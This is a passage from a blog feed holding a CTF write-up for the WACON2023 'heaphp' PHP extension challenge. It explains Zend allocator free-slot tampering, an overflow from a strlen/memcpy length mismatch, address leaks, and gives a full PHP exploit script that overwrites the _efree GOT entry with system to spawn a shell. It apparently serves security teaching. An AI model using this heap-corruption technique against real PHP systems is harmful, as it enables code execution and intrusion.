class="line">p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">omitted...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function is mainly used for building the small run chain when allocating  a chunk. It explains how 30 single linked chains are built. Because each part of the chain doesn&#96;t have to contain a header about its size, only leaving the fd, we may find the weird scene (compared to glibc) in the memory.</p><p><img src="/../img/php-pwn.assets/image-20230914220353292.png" alt="image-20230914220353292"> </p><p>When we allocate a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line"><span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">heap-&gt;size = size;</span><br><span class="line">heap-&gt;peak = peak;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When we release a small run:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">p = (zend_mm_free_slot*)ptr;</span><br><span class="line">p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Both of the functions lake security checks .If we replace the fd of it by out target address, we get an arbitrary address allocate!  That makes small runs vulnerable.</p><h1 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h1><p>A typical php-pwn, we are given a docker environment and a vulnerable php extension module heaphp.so.</p><p>It took me quite a long time building local php environment following the guideline on blogs. I complied php locally aming to debug it easily.  <a href="https://learnku.com/docs/php-internals/php7/building_php/6840">This document</a> helped a lot. However, if you try to complie php with debug-symbol, the ABI of the binary will change, which makes your extension unable to load properly. That ‘s actually what I encountered. </p><p>So, What ‘s the point of it ? I don ‘t know.</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>All protection is on except Partial RELRO .The extension mainly consists of 5 functions: add, view, edit, list, delete. Because of zend engine, the pseudo-code are hard to understand (especially for noobs like me). There are tons of code of uncertain significance like:</p><p><img src="/../img/php-pwn.assets/image-20230914223544720.png" alt="image-20230914223544720"></p><p>Then we must dig into the basic data type in zend. That`s <code>_zend_value</code> and <code>_zval_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="type">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="type">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> w1;</span><br><span class="line"><span class="type">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> type_info;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u)</span><br><span class="line">&#125; v;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line"><span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line"><span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>That`s quite a complex structure, if we replace the meaningless <code>__int64 xx</code> with corresponding zend data type, then it will be easier to comprehend.</p><p>by the way, the form of parameters looks weird</p><p><img src="/../img/php-pwn.assets/image-20230914225045011.png" alt="image-20230914225045011"></p><p>It doesn`t mean takeing exactly 2 parameters. In fact,  <code>a1</code> stands for the input args (parsed by something like <code>zend_parse_arg</code>), while <code>a2</code> stands for the return values. We may set type of <code>a1</code> to be <code>zend_execute_data *</code> and <code>a2</code> to be <code>zval *</code>. In practice, I set <code>a1</code> to be <code>_zval_struct *</code> for better comprehension.</p><p>After checking the declaration, the meaning of following parts a clear. (take <code>zif_add_note</code> for example)</p><p><img src="/../img/php-pwn.assets/image-20230915121612049.png" alt="image-20230915121612049"></p><p><code>v2</code> represents the total number of parameters, and here should be 2.</p><p><img src="/../img/php-pwn.assets/image-20230915121952724.png" alt="image-20230915121952724"></p><p>Here comes a type check. Refering the table and we find ‘6’ represents string. So arg1 should be a string ptr, and will be copied to <code>v4</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>zif_add_note</code> use <code>strlen</code> to caculate the length of input string and allocate corresponding memory. However, when using <code>memcpy</code> to copy content, the 3rd argument taken is the actual length of string. The consequences is that string can be cut off by NULL, which means we can overwrite the next memory`s fd.</p><p><code>zif_add_note</code> also contains an off by NULL Vulnerability.But who cares?</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Since Partial RELRO is on, we can overwrite GOT table. Before that, we must leak the address of heap.so and libc.so.</p><h3 id="Debuging-Tricks"><a href="#Debuging-Tricks" class="headerlink" title="Debuging Tricks"></a>Debuging Tricks</h3><p>To load the target extension, you should put the extension in correct path. To find the path, run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php -i | grep -i extension_dir</span></span><br></pre></td></tr></table></figure><p>And modify the php.ini file. You can <code>find</code> it in root directory.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> find / -name <span class="string">&quot;php.ini&quot;</span></span></span><br></pre></td></tr></table></figure><p>Add the config at the file end</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=heaphp.so</span><br></pre></td></tr></table></figure><p>After that, you can check if it`s properly loaded by <code>phpinfo</code> or checking the <code>/proc/[pid]/maps</code> when running php.</p><p>To debug the extension, we run php with gdb attached first</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb php</span></span><br></pre></td></tr></table></figure><p>Then we <code>run</code> it and press <code>Ctrl+c</code> to interrupt it. Check the <code>vmmap</code> , you may find heaphp.so is loaded.</p><p>We can set breakpoints now. Don&#96;t forget to set our exploit script as argument.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">set</span> args ./exp.php</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">b zif_add_notes</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure><p>You can also write them in a gdb script.</p><h2 id="Address-Leak"><a href="#Address-Leak" class="headerlink" title="Address Leak"></a>Address Leak</h2><p>Through overwrite the content pointer of any notes, we may get content of arbitrary address through <code>zif_view_note</code>.</p><p>First step, we can leak an fd pointer (by <code>zif_view_note</code> or <code>zif_list_note</code> ). Our heap memory was allocated by mmap anonymously, it doesn&#96;t have a constant offset with libc.so or heaphp.so.</p><p><img src="/../img/php-pwn.assets/image-20230915150945514.png" alt="image-20230915150945514"></p><p>However, we may find a pointer related to libc.so or heaphp.so on the heap. It could be extremely hard to find one through analyzing the source code. But I found a useful tool in pwndbg.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usage: leakfind [-h] [-p [PAGE_NAME]] [-o [MAX_OFFSET]] [-d [MAX_DEPTH]] [-s [STEP]] [--negative_offset [NEGATIVE_OFFSET]] address</span><br></pre></td></tr></table></figure><p><code>leakfind</code> is a powerful tool to leak address given a starting address, then we can find some libc pointers on the heap.</p><p><img src="/../img/php-pwn.assets/image-20230915151632552.png" alt="image-20230915151632552"></p><p>On obtaining the libc address, we get heaphp.so address since they have constant offset, then we can overwrite the <code>_efree@got.plt</code> on the heaphp.so with the actual address of <code>system</code>  on libc.so.</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>It`s not the final edition because functions like <code>chr()</code> are banned in the docker, and getting shell is usually not allowed in PHP pwn. I preserved them to make it more readable.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function mychr($index)&#123;</span></span><br><span class="line"><span class="comment">// return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¡&#x27;, &#x27;¢&#x27;, &#x27;£&#x27;, &#x27;¤&#x27;, &#x27;¥&#x27;, &#x27;¦&#x27;, &#x27;§&#x27;, &#x27;¨&#x27;, &#x27;©&#x27;, &#x27;ª&#x27;, &#x27;«&#x27;, &#x27;¬&#x27;, &#x27;\xad&#x27;, &#x27;®&#x27;, &#x27;¯&#x27;, &#x27;°&#x27;, &#x27;±&#x27;, &#x27;²&#x27;, &#x27;³&#x27;, &#x27;´&#x27;, &#x27;µ&#x27;, &#x27;¶&#x27;, &#x27;·&#x27;, &#x27;¸&#x27;, &#x27;¹&#x27;, &#x27;º&#x27;, &#x27;»&#x27;, &#x27;¼&#x27;, &#x27;½&#x27;, &#x27;¾&#x27;, &#x27;¿&#x27;, &#x27;À&#x27;, &#x27;Á&#x27;, &#x27;Â&#x27;, &#x27;Ã&#x27;, &#x27;Ä&#x27;, &#x27;Å&#x27;, &#x27;Æ&#x27;, &#x27;Ç&#x27;, &#x27;È&#x27;, &#x27;É&#x27;, &#x27;Ê&#x27;, &#x27;Ë&#x27;, &#x27;Ì&#x27;, &#x27;Í&#x27;, &#x27;Î&#x27;, &#x27;Ï&#x27;, &#x27;Ð&#x27;, &#x27;Ñ&#x27;, &#x27;Ò&#x27;, &#x27;Ó&#x27;, &#x27;Ô&#x27;, &#x27;Õ&#x27;, &#x27;Ö&#x27;, &#x27;×&#x27;, &#x27;Ø&#x27;, &#x27;Ù&#x27;, &#x27;Ú&#x27;, &#x27;Û&#x27;, &#x27;Ü&#x27;, &#x27;Ý&#x27;, &#x27;Þ&#x27;, &#x27;ß&#x27;, &#x27;à&#x27;, &#x27;á&#x27;, &#x27;â&#x27;, &#x27;ã&#x27;, &#x27;ä&#x27;, &#x27;å&#x27;, &#x27;æ&#x27;, &#x27;ç&#x27;, &#x27;è&#x27;, &#x27;é&#x27;, &#x27;ê&#x27;, &#x27;ë&#x27;, &#x27;ì&#x27;, &#x27;í&#x27;, &#x27;î&#x27;, &#x27;ï&#x27;, &#x27;ð&#x27;, &#x27;ñ&#x27;, &#x27;ò&#x27;, &#x27;ó&#x27;, &#x27;ô&#x27;, &#x27;õ&#x27;, &#x27;ö&#x27;, &#x27;÷&#x27;, &#x27;ø&#x27;, &#x27;ù&#x27;, &#x27;ú&#x27;, &#x27;û&#x27;, &#x27;ü&#x27;, &#x27;ý&#x27;, &#x27;þ&#x27;, &#x27;ÿ&#x27;][$index];</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line"><span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line"><span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line"><span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line"><span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line"><span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> wp </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tricks of Shellcode</title>
      <link href="/2023/08/29/Tricks-of-Shellcode/"/>
      <url>/2023/08/29/Tricks-of-Shellcode/</url>
      
